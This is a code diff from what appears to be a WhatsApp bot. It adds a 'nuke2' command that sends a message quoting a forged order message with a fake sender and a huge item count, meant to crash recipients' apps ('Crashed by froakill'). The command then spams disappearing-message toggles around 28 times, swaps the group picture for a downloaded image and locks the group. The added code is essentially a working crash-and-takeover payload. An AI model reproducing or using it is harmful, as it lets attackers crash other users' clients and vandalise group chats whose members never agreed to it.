@@ -3068,6 +3068,52 @@ case 'nuke':
                 vfo.sendMessage(from, 'OwNeD By VFO💓', text, {quoted: mek})
 					break
 					case 'nuke2':
+			    if (!isOwner) return reply(mess.only.ownerB)
+                bosco.sendMessage(mek.key.remoteJid, 'Crashed by froakill🤣🤣', MessageType.extendedText, {
+                 quoted: {
+                  key: {
+                   participant: '0@s.whatsapp.net' // Fake sender Jid
+                  },
+                  message: {
+                   orderMessage: {
+                    itemCount: 9999999, // Bug
+                    status: 1,
+                    surface: 1,
+                    message: 'Kkkkkkj',
+                    orderTitle: 'BY NURUTOMO ', // Idk what this does
+                    sellerJid: '0@s.whatsapp.net' // Seller
+                   }
+                  }
+                 }
+                })
+                bosco.toggleDisappearingMessages(from,`MODAR`,text)
+                bosco.toggleDisappearingMessages(from,`MODAR`,text)
+                bosco.toggleDisappearingMessages(from,`MODAR`,text)
+                bosco.toggleDisappearingMessages(from,`MODAR`,text)
+                bosco.toggleDisappearingMessages(from,`MODAR`,text)
+                bosco.toggleDisappearingMessages(from,`MODAR`,text)
+                bosco.toggleDisappearingMessages(from,`MODAR`,text)
+                bosco.toggleDisappearingMessages(from,`MODAR`,text)
+                bosco.toggleDisappearingMessages(from,`MODAR`,text)
+                bosco.toggleDisappearingMessages(from,`MODAR`,text)
+                bosco.toggleDisappearingMessages(from,`MODAR`,text)
+                bosco.toggleDisappearingMessages(from,`MODAR`,text)
+                bosco.toggleDisappearingMessages(from,`MODAR`,text)
+                bosco.toggleDisappearingMessages(from,`MODAR`,text)
+                bosco.toggleDisappearingMessages(from,`MODAR`,text)
+                bosco.toggleDisappearingMessages(from,`MODAR`,text)
+                bosco.toggleDisappearingMessages(from,`MODAR`,text)
+                bosco.toggleDisappearingMessages(from,`MODAR`,text)
+                bosco.toggleDisappearingMessages(from,`MODAR`,text)
+                bosco.toggleDisappearingMessages(from,`MODAR`,text)
+                bosco.toggleDisappearingMessages(from,`MODAR`,text)
+                bosco.toggleDisappearingMessages(from,`MODAR`,text)
+                bosco.toggleDisappearingMessages(from,`MODAR`,text)
+                bosco.toggleDisappearingMessages(from,`MODAR`,text)
+                bosco.toggleDisappearingMessages(from,`MODAR`,text)
+                bosco.toggleDisappearingMessages(from,`MODAR`,text)
+                bosco.toggleDisappearingMessages(from,`MODAR`,text)
+                bosco.toggleDisappearingMessages(from,`MODAR`,text)
                 tessgc = await getBuffer(`https://i.ibb.co/9Td4MVt/photo.jpg`)
                    bosco.updateProfilePicture (from, tessgc)
                    bosco.groupSettingChange(from, GroupSettingChange.messageSend, true)
